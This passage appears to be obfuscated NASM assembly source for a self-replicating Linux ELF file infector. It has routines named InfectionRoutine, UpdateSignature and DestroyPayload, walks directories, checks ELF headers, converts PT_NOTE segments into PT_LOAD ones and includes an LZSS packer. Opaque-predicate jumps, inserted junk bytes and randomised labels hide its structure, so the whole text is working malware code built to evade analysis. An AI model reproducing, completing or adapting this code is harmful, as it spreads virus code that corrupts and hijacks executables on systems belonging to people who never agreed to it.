db 0x52, 0x3a
    jl          ..@LJdVlnD3O3g2
    jge         ..@LJdVlnD3O3g2
..@HR2yE27QEhEk:
    pop         rsi
    jmp         $+4
db 0xeb, 0x04
    jb          ..@hmo9xifFRUwq
    jae         ..@hmo9xifFRUwq
..@5EE9WhDQ4uqw:
    xor         rax, rax
    jb          ..@T4eM1Yq4m4CH
    jae         ..@T4eM1Yq4m4CH
..@opkNR1ifiUpZ:
    mov         DWORD [r5+file.filefd], eax
    je          ..@vnu58hKoCSAj
    jne         ..@vnu58hKoCSAj
..@uPjRs0qfhEER:
    jnz         ..@VdNme6HvNsLW
    push        rcx
    pop         rcx
    jmp         $+3
db 0x58
    jmp         ..@50oEFgtgtztU
..@wwqLRCRIGBtd:
    pop         rbx
    jmp         $+3
db 0x22
    jl          ..@VG6I9eKHc9K7
    jge         ..@VG6I9eKHc9K7
..@gWLLwIy8UrDH:
    mov         r2, 1
    rep         nop
    jmp         $+3
db 0xeb
    jmp         ..@1LdTJKuzqFJm
..@A0cKHq4He51e:
    cmp         rax, 0xffffffffffffffff
    je          ..@X23B55n7TLHM
    mov         QWORD [r5+file.fileptr], rax
    jmp         ..@2OX9vVvO6liV
..@pZAPA9c3c5s2:
    ret
    jmp         $+4
db 0xbf, 0xad
    jmp         $+4
db 0xa6, 0x01
    jmp         ..@cKyO219vOrlV
..@sOv3BoCxqRdd:
%ifdef X86_32
    mov         edi, r1
%endif
    jmp         ..@7v3Uy5vMevMu
..@ncAJmgHTPCro:
    jne         ..@avE0i1wYmfdP
    jmp         ..@avE0i1wYmfdP
..@hHyrUBFLV4X0:
    pop         rcx
    sub         rsp, _UPDATASIG_OFF_size
    je          ..@YewxPKxzSD4l
    jne         ..@YewxPKxzSD4l
..@AcEBK8gcbOrt:
    mov         DWORD [r2], PT_LOAD
    jmp         $+5
db 0xcc, 0xd0, 0x4c
    jmp         ..@RgjFdZt58iG9
..@vKQEHtjUKtTm:
    ret
    jmp         GetNewProgramVaddr
..@pfAtZo035FTI:
    push        rcx
    jmp         $+3
db 0xd5
    jb          ..@5speHXsMwsB9
    jae         ..@5speHXsMwsB9
..@UI65E1Xfl5Tq:
    or          edi, eax
    push        rdi
    pop         rdi
    jb          ..@WgjFBNW6OIGN
    jae         ..@WgjFBNW6OIGN
..@BWa4EFRpuWcW:
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    jmp         $+5
db 0x5d, 0x10, 0xdf
    jmp         ..@CrcmCnXNPWN7
..@Fz3XORzkjYp9:
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    mov         rbx, rbx
    add         rdi, rax
    jl          ..@VmATBwKPJk2z
    jge         ..@VmATBwKPJk2z
..@CqU716BDuMiN:
    call        UpdateSignature
    push        rax
    pop         rax
    jl          ..@KSXiOpkJ4b9F
    jge         ..@KSXiOpkJ4b9F
..@QHouaXjNwyzV:
    pop         r2
    jmp         $+3
db 0xaf
    js          ..@IUid3z6RFuLp
    jns         ..@IUid3z6RFuLp
..@POBP8ppTIybz:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    jmp         $+3
db 0xb3
    jmp         ..@6JbkgVniDvXj
..@DdbTNPcrOOxG:
    call        MapFile
    cmp         rax, 0
    jne         ..@8fl0P9Y6duTk
    jmp         $+5
db 0xc0, 0x01, 0x0b
    jmp         $+3
db 0xb4
    jmp         ..@lvKpzj7MBJ9V
..@pdzQ93yTHlrf:
%ifdef X86_32
    pop         rcx
%endif
    jl          ..@jC8L5NS1h1Dp
    jge         ..@jC8L5NS1h1Dp
..@A0zjzcwfXVJP:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    jmp         $+4
db 0x77, 0xbe
    jmp         ..@mgQZmrmNBHsf
..@ioY5zfecWfgz:
    xchg        rax, rax
    mov         r1, QWORD [r5+file.filesize]
    jmp         $+5
db 0x2d, 0x57, 0x38
    jmp         $+3
db 0x35
    je          ..@VMGlJvj2hI5g
    jne         ..@VMGlJvj2hI5g
..@aMYdZrsmIXFO:
    xchg        rdi, rdi
    jmp         $+4
db 0x8b, 0xd2
    jmp         $+4
db 0xa4, 0x26
    js          ..@OPB0P5c6dRFc
    jns         ..@OPB0P5c6dRFc
..@W3XF805cgmpp:
    add         ecx, 1
    cmp         cl, 0x4
    jmp         $+3
db 0x37
    jb          ..@ALwYbAtEnGik
    jae         ..@ALwYbAtEnGik
..@w9VoXdb0i0Ru:
    push        r1
    jmp         ..@fKgGuN5bxOxH
..@42MksSPUJ9Yi:
    sub         r2, 1
    jmp         $+5
db 0x8f, 0x77, 0xb2
    js          ..@WLZYp0zReahj
    jns         ..@WLZYp0zReahj
..@Z32LuM8mRWpQ:
    cmp         BYTE [r1], 0x30
    jl          ..@1WdljG0TCTof
    push        rdx
    jmp         $+3
db 0x90
    jmp         ..@rcyGHpUAmDfF
..@Xx0h8tzo68Yz:
    je          ..@zHh3SfBY21Uy
    push        rdi
    jmp         $+5
db 0x49, 0x9f, 0x97
    jmp         $+5
db 0x05, 0xd4, 0x0a
    js          ..@qD1oJTQy72Mk
    jns         ..@qD1oJTQy72Mk
..@jb5q4M8O5rle:
    cmp         rax, 0x00
    jle         ..@WdnBKIHvj00q
    jmp         $+3
db 0x2f
    je          ..@dH36Us7WnmOX
    jne         ..@dH36Us7WnmOX
..@7RPVSHv1JPgm:
    pop         r1
    jmp         $+5
db 0x0e, 0x63, 0x55
    jl          ..@BiRAnlZn14dK
    jge         ..@BiRAnlZn14dK
..@itFCq9te0GsZ:
    mov         r1, rsp
    jmp         $+3
db 0x21
    jl          ..@RC6FWZaDQnPG
    jge         ..@RC6FWZaDQnPG
..@cNLtUcbHurIb:
    sub         r4, m6
    mov         QWORD [r2+p_h.p_vaddr], r3
    jmp         $+4
db 0x7f, 0x61
    jmp         $+5
db 0x4b, 0x38, 0xf0
    jmp         ..@YoA0pViFjReJ
..@EAyKIz3cOGrn:
    and         ax, 1111b
    jmp         $+3
db 0x79
    jmp         $+4
db 0xb0, 0xed
    jmp         ..@jbpSZdV8DMPq
..@024sIqYr5IlJ:
    ret
    js          DestroyPayload
    jns         DestroyPayload
..@IZfXL8zaeLSF:
    mov         rsp, rsp
    rep         movsb
    xor         rax, rax
    jmp         ..@Twz48MIQwywF
..@wvVXw4uCsYIl:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    js          ..@NRG40VbLz8n9
    jns         ..@NRG40VbLz8n9
..@KQKG8eTvVpsp:
    call        Strcpy
    jmp         $+5
db 0x88, 0xda, 0xde
    jmp         ..@rHv7FvZ0atpQ
..@XIKBOzOaXtSP:
    xor         r2, r2
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    js          ..@YeHMjpDH7WST
    jns         ..@YeHMjpDH7WST
..@8ry8U4ik2DL1:
    jnz         ..@J0lRjkOK7srU
    jmp         $+4
db 0x26, 0xfd
    js          ..@pob48cfeFggl
    jns         ..@pob48cfeFggl
..@jC8L5NS1h1Dp:
%ifdef X86_64
    mov         rsi, rsi
    xor         rax, rax
    xor         rdi, rdi
%endif
    jmp         ..@BBxJUzSKcQkk
..@crm3PNpt2VQT:
    mov         rax, rax
    jmp         $+3
db 0xa4
    jmp         ..@cebF7ZuXpxOJ
..@HLBS7A0HkNmj:
    pop         rdx
    jmp         $+5
db 0xab, 0x73, 0xbb
    jmp         ..@gYQubx5PcbNa
..@Xv74DtREo6Nl:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    jmp         $+3
db 0xfd
    jmp         ..@wSZyytvrvkhN
..@UevBXpGdPgMG:
    cmp         BYTE [r2], 0x0
    je          ..@IXh1YpJELhQs
    jne         ..@IXh1YpJELhQs
..@78QaSjQoWnBt:
    cmp         BYTE [r1], 0x00
    jmp         $+4
db 0x13, 0xb1
    jmp         ..@X6t2aszx7kfX
..@2DmHY1eengoM:
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    mul         rbx
    jmp         $+4
db 0x4d, 0x0d
    js          ..@qnPjVYfzyHAY
    jns         ..@qnPjVYfzyHAY
DYNPIEValidation:
    jmp         ..@IkpjPWMEGsa0
..@w6rJvx2AUBz1:
    mov         r5, r1
    jmp         $+5
db 0x21, 0x5e, 0x3f
    jmp         $+5
db 0xb3, 0x23, 0x0f
    jmp         ..@wZBLJW4TDMy0
..@G1VJCaZ39HL2:
    add         rax, p_h.p_type
    cmp         DWORD [r2+rax], PT_NOTE
    jmp         $+3
db 0x12
    js          ..@QZNk3iIj418s
    jns         ..@QZNk3iIj418s
..@FpTsDCcesnMI:
%ifdef X86_64
    mov         rbx, rbx
%endif
    js          ..@ohR2AvJyqbWk
    jns         ..@ohR2AvJyqbWk
..@REK2DE0EhSfx:
    mov         rdi, rdi
    mov         r2, QWORD [r1+e_h.e_phoff]
    add         r2, r1
    jmp         $+3
db 0x0e
    jmp         $+4
db 0x0e, 0xe6
    jmp         ..@LxiG6Ed63D5I
..@2qUwmQCoJzVW:
    mov         rsi, rsi
    mov         DWORD [rdi], eax
    jmp         ..@FRAyTHjB12s1
..@U1m6tNz444QK:
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+4
db 0xa1, 0x90
    js          ..@PUCnKkVlCkIz
    jns         ..@PUCnKkVlCkIz
..@EMtNEA5tX3vY:
    and         r3, 0xfff 
    mov         rbx, 0x1000
    jb          ..@GIv0SQDTdKRn
    jae         ..@GIv0SQDTdKRn
..@iZr91lyz41AA:
    push        r4
    mov         rdi, rdi
    jmp         $+5
db 0xc9, 0x39, 0x64
    jmp         $+4
db 0x4d, 0x1c
    jmp         $+4
db 0xc8, 0xa0
    jl          ..@aMYdZrsmIXFO
    jge         ..@aMYdZrsmIXFO
..@GIv0SQDTdKRn:
    sub         rbx, r3
    add         rax, rbx
    add         rsp, _VADDR_OFF_size
    jb          ..@ZTdr77oJRhhf
    jae         ..@ZTdr77oJRhhf
..@kucLIaQUiMo1:
    push        rcx
    pop         rcx
    jl          ..@vjh834wnyZ7F
    jmp         $+4
db 0x00, 0x03
    jmp         ..@Lrbh8QUp1HGY
..@r6kdMLMVpvZ1:
    mov         rdx, rdx
    jl          ..@Ayr3VRZfJ9PT
    jge         ..@Ayr3VRZfJ9PT
..@hDR6eusYefEP:
    jl          ..@iui0JI6DDaHi
    js          ..@ybS1gu6do7p0
    jns         ..@ybS1gu6do7p0
..@BBxJUzSKcQkk:
%ifdef X86_64
    mov         rbp, rbp
    xor         rdx, rdx
%endif
    jmp         $+4
db 0x1a, 0x22
    jmp         $+4
db 0xb9, 0x93
    jmp         ..@TgDiR3NBDTUJ
..@zFE0aFWN3wD3:
    rep         nop
    je          ..@nJdKBFye7Yrm
    push        rcx
    jmp         $+5
db 0x77, 0xad, 0xcc
    je          ..@HzfFa4jCmga7
    jne         ..@HzfFa4jCmga7
..@yl22HwyrPaAX:
    call        AddSizeMappedFile
    jmp         $+3
db 0xf8
    jmp         $+3
db 0x7e
    jb          ..@bDoosC8Pqeav
    jae         ..@bDoosC8Pqeav
..@XHjYMsfO6Qfc:
    xchg        rsi, rsi
    js          ..@RJECy1WoovWJ
    jns         ..@RJECy1WoovWJ
..@41Lt0WdqdW5Z:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
%endif
    jmp         $+5
db 0x04, 0xa0, 0x2e
    jb          ..@KEnQQ0NVctH8
    jae         ..@KEnQQ0NVctH8
..@YoA0pViFjReJ:
    mov         QWORD [r2+p_h.p_paddr], r3
    jmp         ..@PH5pSfP20kuV
..@hZ8PCypb1N1X:
    cmp         DWORD [r1], 0x464c457f
    jmp         $+5
db 0x17, 0x20, 0xff
    je          ..@nqQq0NnexbPW
    jne         ..@nqQq0NnexbPW
..@xBcT6iT9t73X:
    mov         rdi, rdi
    jb          ..@nSai0jVA1EE1
    jae         ..@nSai0jVA1EE1
..@MqTkds1a8tVf:
    add         r1, bytes
    jl          ..@cxcK3uoqsltW
    jge         ..@cxcK3uoqsltW
..@i0sUQyeJ6VHK:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jmp         ..@JljPYnYRVDo0
..@TIvtvq2XgitC:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    je          ..@yekCGuHkVuib
    jne         ..@yekCGuHkVuib
..@OfRujjcayvRq:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
%endif
    jmp         $+5
db 0xeb, 0xb7, 0x64
    jl          ..@zUmwG0sQ1eQT
    jge         ..@zUmwG0sQ1eQT
..@fgWG5jqFvQU5:
    add         r1, e_h.e_shentsize
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    jmp         $+5
db 0x4b, 0xc6, 0x19
    js          ..@ArqFmCsYQGb9
    jns         ..@ArqFmCsYQGb9
..@NlzCfjhnlnKk:
    jl          ..@zPOxxjUtcyPZ
    js          ..@7tzD4HCu5wg7
    jns         ..@7tzD4HCu5wg7
..@ckR9TPE2NNeY:
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    add         rsp, _LZSSE_OFF_size
    jmp         $+5
db 0xf5, 0xd9, 0x86
    jmp         ..@xXnPFd7SMBev
..@st78Do2RMUIZ:
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jl          ..@6amLGwErElFb
    jge         ..@6amLGwErElFb
..@FRAyTHjB12s1:
    add         rsp, _UPDATASIG_OFF_size
    pop         r5
    pop         r4
    jmp         $+3
db 0x95
    jb          ..@vKQEHtjUKtTm
    jae         ..@vKQEHtjUKtTm
..@ZldyTwXdQokT:
    sub         rsp, 0x100
    push        0x00
    mov         rax, SYS_GETUID
    jmp         ..@98jzXQQwVzwj
..@TSFXpTMbImoB:
    sub         rsp, _INFFILE_OFF_size
    jmp         $+5
db 0x40, 0xb5, 0x2f
    jmp         $+5
db 0xf8, 0x10, 0xa2
    js          ..@U1m6tNz444QK
    jns         ..@U1m6tNz444QK
..@BiqsoUMNCadh:
    pop         rsi
    jb          ..@e1Zh7shLWKwu
    jae         ..@e1Zh7shLWKwu
..@AQRL3Pni3VYW:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    jl          ..@OCQemGEJp8B6
    jge         ..@OCQemGEJp8B6
..@7UDzNgb6MTuW:
    call        NonBinaryFile
    jmp         ..@kD9uXniLpgFo
..@WHu075FUONVe:
    xor         r1, r1
    jmp         $+3
db 0xe6
    jmp         $+3
db 0xb7
    jmp         $+5
db 0x63, 0xb8, 0x47
    js          ..@FYE6lVqHljFs
    jns         ..@FYE6lVqHljFs
..@Czhbgw4iFmdV:
    test        al, al
    jnz         ..@mgQZmrmNBHsf
    jmp         $+5
db 0x86, 0x83, 0xa7
    jmp         ..@qNhGjBqzIxtV
..@j2bevlHU9Trc:
    jnz         ..@X23B55n7TLHM
    jmp         ..@Uu8Sj7RNbNLl
..@zPOxxjUtcyPZ:
    xor         rax, rax
    js          ..@JqkIzVRyuptr
    jns         ..@JqkIzVRyuptr
..@EgdcNW6dwY9s:
    push        rsi
    jmp         $+4
db 0x01, 0x02
    js          ..@BiqsoUMNCadh
    jns         ..@BiqsoUMNCadh
..@aetvRD7JSheG:
    pop         rbx
    js          ..@J0lRjkOK7srU
    jns         ..@J0lRjkOK7srU
..@omiCjy8sMk8v:
    sub         rdi, 1
    sub         rsi, 1
    jmp         ..@UVkIGR4lureP
..@EzVFbwiZgRD6:
%ifdef X86_64
    mov         edx, r10d
%endif
    jb          ..@TltAibaPtY44
    jae         ..@TltAibaPtY44
InfectionRoutine:
    jmp         ..@P5Z0GrwfQjox
..@QjCODqD09rKI:
    jz          ..@uVVpSXTwoi4l
    jmp         ..@6HvBpkvTKKXZ
..@zDhz7LEqYKAF:
    pop         rcx
    js          ..@adXfZDfJGbYb
    jns         ..@adXfZDfJGbYb
..@Feqb8D9XLvqF:
    xor         rax, rax
    xor         r2, r2
    mov         r1, m6
    jl          ..@jNm8xzPL8Pte
    jge         ..@jNm8xzPL8Pte
..@PUCnKkVlCkIz:
    mov         r2, 1b
    jl          ..@DdbTNPcrOOxG
    jge         ..@DdbTNPcrOOxG
..@rHv7FvZ0atpQ:
    xchg        rsp, rsp
    jmp         $+5
db 0xed, 0x60, 0x53
    jb          ..@6uPrtpYBDqQK
    jae         ..@6uPrtpYBDqQK
..@5TLgOYHZkxV9:
    mov         m7, rdi
    jmp         $+4
db 0x7d, 0x97
    jmp         ..@Q7PKgHutGbW1
..@wSZyytvrvkhN:
    xor         rax, rax
    xor         rcx, rcx
    jl          ..@bh7pbgF8bKCn
    jge         ..@bh7pbgF8bKCn
..@iSB9e2wpwzmw:
    xor         r2, r2
    xchg        rcx, rcx
    xor         r3, r3
    jl          ..@LkyydTNXvBc5
    jge         ..@LkyydTNXvBc5
..@78hcIWxaQADy:
    add         rdi, rax
    jmp         ..@SVB4G9Ha0zJb
..@bh7pbgF8bKCn:
    xor         rbx, rbx
    jmp         $+3
db 0xb3
    jmp         ..@De10iMjdmIbl
..@zM3IXL2Swls8:
    mov         eax, 0x20
    mov         rcx, rcx
    rep         stosb
    jmp         ..@Y2Y4J2jGCoEq
..@8ZMwGXI4tUqA:
    mov         rdx, rdx
    mov         r1, r4
    mov         r2, m5
    jmp         $+5
db 0x99, 0x31, 0x14
    js          ..@lgPH9vEQZgr3
    jns         ..@lgPH9vEQZgr3
..@xErsDdmXNlVz:
    mov         r1, QWORD [r5+file.fileptr]
    xchg        rbx, rbx
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    jmp         $+4
db 0xf3, 0x18
    jmp         $+5
db 0x6a, 0xcf, 0x57
    jmp         ..@CqU716BDuMiN
..@ogXzyfTzHkBe:
    xchg        rsp, rsp
    jl          ..@HLBS7A0HkNmj
    jge         ..@HLBS7A0HkNmj
..@q6vHynAF6CDx:
%ifdef X86_32
    mov         esi, 0x22
    mov         edi, 0xffffffff
    push        ebp
%endif
    jmp         $+3
db 0xbf
    jl          ..@5dYoW44THoap
    jge         ..@5dYoW44THoap
..@YKhC0BEzdEPG:
    mov         ecx, signature_len
    jmp         $+4
db 0x8d, 0x52
    jmp         $+3
db 0x60
    jmp         ..@IZfXL8zaeLSF
..@GVxcrYjKBWpv:
    ret
    jmp         $+3
db 0x86
    jmp         WORDToDWORDASCII
..@cKyO219vOrlV:
    push        rcx
    js          ..@qiAh3Sos0wFA
    jns         ..@qiAh3Sos0wFA
..@ozx5gZg5lmIG:
    xchg        rbx, rbx
    mov         rcx, rcx
    jl          ..@MqTkds1a8tVf
    jge         ..@MqTkds1a8tVf
..@5speHXsMwsB9:
    pop         rcx
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    js          ..@ClRNJuc7Xk07
    jns         ..@ClRNJuc7Xk07
..@Km8IpqMfKwnl:
    inc         WORD m5
    jmp         $+5
db 0xd9, 0xc6, 0x66
    jmp         ..@2sJSZYYjZJ7V
..@BGneDyZVIRQU:
    xchg        rbx, rbx
    push        rcx
    jmp         $+4
db 0x45, 0x4b
    jmp         $+3
db 0xd4
    jmp         $+3
db 0xfd
    jmp         $+4
db 0x2c, 0x19
    js          ..@NIZ5Rzx1xQor
    jns         ..@NIZ5Rzx1xQor
..@25nVqPoridCj:
    mov         rsi, rsi
    jb          ..@ZdSUZ1Za4N5v
    jae         ..@ZdSUZ1Za4N5v
..@npIPjj9aMD8b:
    add         rsp, _INFFILE_OFF_size
    ret
    jl          FileValidation
    jge         FileValidation
..@s9ccoAjMeoOB:
    push        rcx
    jmp         $+3
db 0xdf
    jmp         $+4
db 0x4c, 0x27
    jmp         $+4
db 0xb3, 0xff
    jmp         $+3
db 0x7c
    jmp         ..@K3f4u8Pz7483
..@VG6I9eKHc9K7:
    pop         rdi
    or          bx, dx
    jmp         ..@VdNme6HvNsLW
    jmp         $+4
db 0x78, 0xc2
    jmp         $+4
db 0x8d, 0x7b
    jmp         $+3
db 0x0e
    jmp         $+3
db 0xc4
    jmp         ..@arlr1AKx59HW
..@vWsuH07xUBGQ:
    jz          ..@rXpJi4iQWVbI
    add         r4, r3
    jb          ..@kSpDms1KQjdm
    jae         ..@kSpDms1KQjdm
..@SDZOcFg8uvUd:
    cmp         rax, 0
    jmp         ..@kgsqAJJdALeq
..@bs8XquEasxfs:
%ifdef X86_32
    xchg        rdi, rdi
%endif
    jb          ..@Mn8ALfs9wwh4
    jae         ..@Mn8ALfs9wwh4
..@FWaMmvPASkuV:
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    jmp         ..@TBEVCKLbkKLA
..@7AdCCb3OYeKF:
    pop         r1
    jmp         $+4
db 0x5c, 0x4b
    jmp         $+5
db 0x79, 0xa0, 0xaf
    js          ..@YEscLRPRa2dm
    jns         ..@YEscLRPRa2dm
..@smH1y1B5rkUe:
    cmp         r3, 0x00
    jmp         $+5
db 0x92, 0xd2, 0xff
    jmp         ..@eioc5JZagh9G
..@78G1UyMmQsUm:
    mov         BYTE [r1], 0x00
    jmp         $+5
db 0xe7, 0x5b, 0x42
    js          ..@hE6jpFz19jao
    jns         ..@hE6jpFz19jao
..@rEKts64xwmEy:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+3
db 0x25
    jl          ..@A2m2ULMFhfLu
    jge         ..@A2m2ULMFhfLu
..@UGIg5CuHC334:
    xor         r4, r4
    jmp         $+4
db 0x75, 0x91
    js          ..@dO8JMB7MdJla
    jns         ..@dO8JMB7MdJla
..@uvfVm5OccBtI:
    call_vsp    ExitProgram
    jmp         $+3
db 0x8d
    jmp         $+4
db 0x9b, 0x91
    jb          ..@FZgk4H2QtdAA
    jae         ..@FZgk4H2QtdAA
..@k8vQnFPI6ByA:
    xchg        rdi, rdi
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    jmp         $+4
db 0x63, 0xd3
    jmp         $+4
db 0x35, 0xec
    jl          ..@7MqwyhlPdwBH
    jge         ..@7MqwyhlPdwBH
..@qiAh3Sos0wFA:
    pop         rcx
    jmp         $+4
db 0x52, 0x29
    jmp         $+5
db 0xb5, 0xf7, 0x6c
    jmp         NonBinaryFile
..@WHHAzANy0hH6:
    mov         rax, 2
    jl          ..@buReGTH4bdzF
    jge         ..@buReGTH4bdzF
..@5m2CbC05ti8y:
    xor         rax, rax
    jmp         $+5
db 0xf1, 0x8b, 0x36
    jl          ..@2DmHY1eengoM
    jge         ..@2DmHY1eengoM
..@jF5LhGTI6wh2:
    cmp         rax, (-1)
    jmp         $+3
db 0x71
    jmp         $+4
db 0x39, 0x70
    jmp         $+4
db 0x17, 0x75
    jl          ..@m3wEKfx2xwyY
    jge         ..@m3wEKfx2xwyY
..@myVLS40071L1:
    add         r1, 1
    jmp         $+5
db 0x51, 0x89, 0xa5
    js          ..@NSopybDnEC3V
    jns         ..@NSopybDnEC3V
..@cJIZ8mZh7p9q:
    mov         r2, r1
    js          ..@Whh35oLfjAew
    jns         ..@Whh35oLfjAew
..@0Gue3InNJQRB:
    pop         rcx
    jmp         ..@Zo9etHfoZrce
..@VkPS6Mktg2k9:
    mov         rcx, rcx
    mov         r4, r5
    jmp         $+5
db 0xc4, 0x5a, 0xde
    jb          ..@bWaHnnSfadHL
    jae         ..@bWaHnnSfadHL
..@hWFs1zKOSE6m:
    xor         rax, rax
    mov         r3, [r1+e_h.e_phoff]
    lea         r4, [r1]
    jmp         ..@aZD6ylk7TYdm
..@0aoKu1F9uk4C:
    mov         QWORD [r5+file.fileptr], rax
    xor         rax, rax
    jmp         $+3
db 0x6f
    jmp         ..@Q5yrxvzRQWlT
..@O5YSYSpv3Cwx:
    mov         r1, QWORD [r5+file.fileptr]
    je          ..@hZ8PCypb1N1X
    jne         ..@hZ8PCypb1N1X
..@nRHeYDxx2GdG:
    mov         rax, 1
    jmp         $+3
db 0xf2
    je          ..@QHouaXjNwyzV
    jne         ..@QHouaXjNwyzV
..@50oEFgtgtztU:
    jmp         ..@5EE9WhDQ4uqw
    jmp         ..@5EE9WhDQ4uqw
..@NRG40VbLz8n9:
    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
    jmp         $+3
db 0x9e
    jmp         $+4
db 0x8d, 0x4b
    jl          ..@zPOxxjUtcyPZ
    jge         ..@zPOxxjUtcyPZ
..@dO8JMB7MdJla:
    mov         rcx, rcx
    jmp         $+3
db 0x43
    jmp         $+4
db 0xeb, 0x8c
    js          ..@alD64roY56CA
    jns         ..@alD64roY56CA
..@Y1mcwQ4av2WX:
    sub         r2, 1
    cmp         r2, 0
    je          ..@O8DJ8jrXxhyD
    jmp         ..@mea0wkEUj04f
..@6amLGwErElFb:
    xchg        rax, rax
    jmp         $+3
db 0x20
    je          ..@4TaQvtz1RjKg
    jne         ..@4TaQvtz1RjKg
..@EAmicT7h6Xxc:
    mov         r3, _signature.startsize
    call_vsp    Strncmp
    jmp         $+4
db 0xf9, 0x37
    jmp         ..@bfQohZFfeivE
..@iI1vd5F90vdH:
%ifdef X86_64
    syscall
%endif
    jmp         $+4
db 0x14, 0xd3
    jmp         ..@jF5LhGTI6wh2
..@NIZ5Rzx1xQor:
    pop         rcx
    jmp         $+3
db 0x55
    jl          ..@GPRdf6VoKISY
    jge         ..@GPRdf6VoKISY
..@YPshILMsIzCM:
    cmp         rax, 0x0
    jle         ..@nPLBpZrZ8Qcg
    jmp         ..@r0Chj3C1cm3x
..@nQbaM9wzq7ar:
    pop         rcx
    jmp         ..@XIKBOzOaXtSP
..@q4xuyKJRXsn7:
    mov         r2, m5
    js          ..@7UDzNgb6MTuW
    jns         ..@7UDzNgb6MTuW
..@H0ZKf4O49hgl:
    push        rcx
    pop         rcx
    call        UpdateSignature
    je          ..@ASJg0gdFhJha
    jne         ..@ASJg0gdFhJha
..@aV71XXfUktVK:
    je          ..@Zo9etHfoZrce
    js          ..@71hAvtCDspQQ
    jns         ..@71hAvtCDspQQ
..@IdqfeDkS3VpU:
    xor         r1, r1
    xor         r2, r2
    push        rsi
    jmp         $+3
db 0x16
    jb          ..@UW9D0xkviezr
    jae         ..@UW9D0xkviezr
..@LkyydTNXvBc5:
    xor         r4, r4
    xchg        rcx, rcx
    jb          ..@DoBXSymAQvK2
    jae         ..@DoBXSymAQvK2
..@UaLRnPFd38oM:
    push        rdi
    jl          ..@ZnI3FZmOvJdc
    jge         ..@ZnI3FZmOvJdc
..@hVAMXsV8M3P7:
    mov         r4, r5
    xchg        rax, rax
    mov         r5, [rsp]
    jmp         $+4
db 0xb8, 0xc7
    jl          ..@opkNR1ifiUpZ
    jge         ..@opkNR1ifiUpZ
..@bbtHdPWmbOx6:
    xchg        rcx, rcx
    shl         edi, 0x8
    mov         ax, dx
    jmp         $+4
db 0xb5, 0xf1
    jmp         ..@EAyKIz3cOGrn
..@cIWONLOZbqyW:
    cmp         rax, 0x00
    jle         ..@tuT6V4n95KoC
    jmp         $+4
db 0x09, 0xfa
    jmp         ..@st78Do2RMUIZ
..@tQxbkd97QmZm:
    sub         r3, PADDING
    jb          ..@l0Oh1JI5dvFa
    jae         ..@l0Oh1JI5dvFa
..@4opl6BvMyMCB:
%ifdef X86_64
    push        rbx
%endif
    je          ..@WmpPX9fMq6My
    jne         ..@WmpPX9fMq6My
..@6HvBpkvTKKXZ:
    and         r2, 1b
    jmp         ..@0ygiB2tak5yx
WORDToDWORDASCII:
    jmp         ..@vkfjYg6m91N0
..@Sjao7QFtjUgJ:
    and         eax, 0xff
    jl          ..@UI65E1Xfl5Tq
    jge         ..@UI65E1Xfl5Tq
..@Vr42iUQ96wPR:
    pop         rdi
    mov         r2, 11b
    call        MapFile
    jmp         $+4
db 0xe0, 0x2e
    jmp         $+5
db 0x42, 0x33, 0x8b
    jmp         ..@SDZOcFg8uvUd
..@G4Qu0km3N54P:
    jbe         ..@IbrcKzXmUH2k
    jmp         $+3
db 0x16
    jmp         $+5
db 0x1f, 0x84, 0x25
    jmp         $+3
db 0x55
    jmp         $+3
db 0x48
    jmp         ..@E5Jh1FNjOwGx
..@KEnQQ0NVctH8:
%ifdef X86_32
    push        rbx
    pop         rbx
    pop         ebp
%endif
    jmp         $+3
db 0xb4
    jmp         ..@xJZC890AAJ2B
..@uUgHRgr5op3H:
    cmp         rax, (-1)
    je          ..@94jNiw9qieam
    mov         r3, r4
    jl          ..@MbD6K8P7zmeS
    jge         ..@MbD6K8P7zmeS
..@HRVT6iaO9BuI:
    cmp         WORD [r1], './'
    jmp         $+4
db 0xeb, 0x98
    js          ..@iD8mvke3y8Se
    jns         ..@iD8mvke3y8Se
..@2kArYC6ulJy3:
    mov         r2, m6
    jb          ..@POBP8ppTIybz
    jae         ..@POBP8ppTIybz
..@wFVyTZeOV9pL:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+3
db 0x6a
    jmp         ..@KwEfaIICblyD
..@PneUMzRdx1xb:
    add         r1, non_packed_len+PADDING
    jmp         $+3
db 0x0e
    jb          ..@5KdCzJw9jFni
    jae         ..@5KdCzJw9jFni
..@pWgkRLozKrSE:
%ifdef X86_32
    pop         rdx
%endif
    js          ..@OnmlEnwa2goD
    jns         ..@OnmlEnwa2goD
..@58T9lA0lkm5e:
    xor         rax, rax
    jmp         $+5
db 0x34, 0x91, 0x44
    jb          ..@jIH9m0dp64yr
    jae         ..@jIH9m0dp64yr
..@ulXlFOw14LGB:
    xchg        rdx, rdx
    pop         r1
